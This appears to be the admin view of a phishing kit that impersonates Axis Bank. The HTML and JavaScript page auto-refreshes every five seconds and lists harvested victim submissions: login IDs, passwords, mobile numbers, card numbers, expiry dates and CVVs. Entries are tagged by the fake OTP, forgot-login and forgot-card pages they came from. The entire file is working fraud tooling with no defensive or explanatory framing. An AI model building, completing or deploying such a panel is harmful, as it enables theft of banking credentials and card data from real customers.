<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Axis Bank - Submissions</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }
        
        body {
            background: white;
            color: #333;
            padding: 10px;
        }
        
        .header {
            background: #87103F;
            padding: 15px;
            text-align: center;
            border-radius: 8px;
            margin-bottom: 20px;
            box-shadow: 0 4px 8px rgba(135, 16, 63, 0.2);
        }
        
        .bank-title {
            font-size: 32px;
            font-weight: bold;
            color: white;
            letter-spacing: 1px;
            margin-bottom: 8px;
        }
        
        .live-indicator {
            display: inline-block;
            background: white;
            color: #87103F;
            padding: 5px 15px;
            border-radius: 15px;
            font-weight: bold;
            font-size: 16px;
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        
        .refresh-info {
            text-align: center;
            margin: 10px 0;
            color: #87103F;
            font-weight: bold;
            font-size: 14px;
        }
        
        .submissions-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        
        .submission-item {
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #ddd;
            background: #f9f9f9;
            animation: slideIn 0.3s ease;
            position: relative;
        }
        
        .new-submission {
            background: #fff0f5;
            border: 2px solid #87103F;
            animation: newPulse 5s infinite;
        }
        
        @keyframes newPulse {
            0%, 100% { border-color: #87103F; }
            50% { border-color: #ff6b9d; }
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .submission-type {
            background: #87103F;
            color: white;
            padding: 4px 12px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: bold;
            display: inline-block;
            margin-bottom: 8px;
        }
        
        .submission-time {
            color: #666;
            font-size: 13px;
            margin-bottom: 8px;
        }
        
        .submission-page {
            color: #87103F;
            font-size: 13px;
            margin-bottom: 10px;
            font-weight: bold;
        }
        
        .submission-details {
            font-size: 15px;
            line-height: 1.5;
        }
        
        .detail-row {
            display: flex;
            margin-bottom: 6px;
            align-items: center;
        }
        
        .detail-label {
            min-width: 120px;
            color: #666;
            font-size: 14px;
        }
        
        .detail-value {
            flex: 1;
            word-break: break-all;
            color: #333;
            font-weight: 500;
        }
        
        .empty-message {
            text-align: center;
            padding: 40px 20px;
            color: #666;
            font-size: 16px;
        }
        
        /* Mobile view */
        @media (max-width: 768px) {
            .header {
                padding: 12px;
                margin-bottom: 15px;
            }
            
            .bank-title {
                font-size: 26px;
            }
            
            .live-indicator {
                font-size: 14px;
                padding: 4px 12px;
            }
            
            .submission-item {
                padding: 12px;
            }
            
            .detail-row {
                flex-direction: column;
                align-items: flex-start;
                margin-bottom: 8px;
            }
            
            .detail-label {
                min-width: auto;
                margin-bottom: 2px;
                font-size: 13px;
            }
            
            .detail-value {
                font-size: 15px;
            }
        }
        
        @media (max-width: 480px) {
            body {
                padding: 8px;
            }
            
            .bank-title {
                font-size: 22px;
            }
            
            .submission-details {
                font-size: 14px;
            }
            
            .detail-label, .detail-value {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="bank-title">AXIS BANK</div>
        <div class="live-indicator">ðŸ”´ LIVE</div>
    </div>
    
    <div class="refresh-info" id="refreshInfo">
        Auto refresh in: <span id="countdown">5</span>s
    </div>
    
    <div class="submissions-list" id="submissionsList">
        <!-- Submissions will appear here -->
    </div>

    <script>
        // Format time
        function formatTime(dateString) {
            const date = new Date(dateString);
            return date.toLocaleString('en-IN', {
                day: '2-digit',
                month: '2-digit',
                year: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: true
            });
        }
        
        // Get page name from URL
        function getPageName(url) {
            if (!url) return 'Main Page';
            if (url.includes('axis_otp1.html')) return 'OTP Page';
            if (url.includes('axis_otp2.html')) return 'OTP Page 2';
            if (url.includes('forgot_login.html')) return 'Forgot Login';
            if (url.includes('forgot_card.html')) return 'Forgot Card';
            return 'Main Page';
        }
        
        // Load and display submissions
        function loadSubmissions() {
            const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
            const submissionsList = document.getElementById('submissionsList');
            
            if (submissions.length === 0) {
                submissionsList.innerHTML = `
                    <div class="empty-message">
                        No submissions yet.<br>
                        Waiting for data...
                    </div>
                `;
                return;
            }
            
            // Sort: new submissions first, then by timestamp (newest first)
            submissions.sort((a, b) => {
                if (a.isNew !== b.isNew) {
                    return a.isNew ? -1 : 1;
                }
                return new Date(b.timestamp) - new Date(a.timestamp);
            });
            
            let html = '';
            
            submissions.forEach(submission => {
                let detailsHTML = '';
                
                if (submission.type === 'login') {
                    detailsHTML = `
                        <div class="detail-row">
                            <div class="detail-label">Login ID:</div>
                            <div class="detail-value">${submission.data.loginId || 'N/A'}</div>
                        </div>
                        <div class="detail-row">
                            <div class="detail-label">Password:</div>
                            <div class="detail-value">${submission.data.password || 'N/A'}</div>
                        </div>
                        <div class="detail-row">
                            <div class="detail-label">Mobile:</div>
                            <div class="detail-value">${submission.data.mobile || 'N/A'}</div>
                        </div>
                    `;
                } else if (submission.type === 'credit') {
                    detailsHTML = `
                        <div class="detail-row">
                            <div class="detail-label">Card Number:</div>
                            <div class="detail-value">${submission.data.cardNumber || 'N/A'}</div>
                        </div>
                        <div class="detail-row">
                            <div class="detail-label">Expiry:</div>
                            <div class="detail-value">${submission.data.expiry || 'N/A'}</div>
                        </div>
                        <div class="detail-row">
                            <div class="detail-label">CVV:</div>
                            <div class="detail-value">${submission.data.cvv || 'N/A'}</div>
                        </div>
                        <div class="detail-row">
                            <div class="detail-label">Mobile:</div>
                            <div class="detail-value">${submission.data.mobile || 'N/A'}</div>
                        </div>
                    `;
                }
                
                html += `
                    <div class="submission-item ${submission.isNew ? 'new-submission' : ''}">
                        <div class="submission-type">${submission.type.toUpperCase()}</div>
                        <div class="submission-time">${formatTime(submission.timestamp)}</div>
                        <div class="submission-page">From: ${getPageName(submission.data.time || '')}</div>
                        <div class="submission-details">
                            ${detailsHTML}
                        </div>
                    </div>
                `;
            });
            
            submissionsList.innerHTML = html;
        }
        
        // Auto-refresh countdown
        let countdown = 5;
        let countdownInterval;
        
        function startCountdown() {
            countdown = 5;
            document.getElementById('countdown').textContent = countdown;
            
            clearInterval(countdownInterval);
            countdownInterval = setInterval(() => {
                countdown--;
                document.getElementById('countdown').textContent = countdown;
                
                if (countdown <= 0) {
                    clearInterval(countdownInterval);
                    loadSubmissions();
                    startCountdown();
                }
            }, 1000);
        }
        
        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            loadSubmissions();
            startCountdown();
            
            // Auto refresh every 5 seconds
            setInterval(loadSubmissions, 5000);
        });
    </script>
</body>
</html>
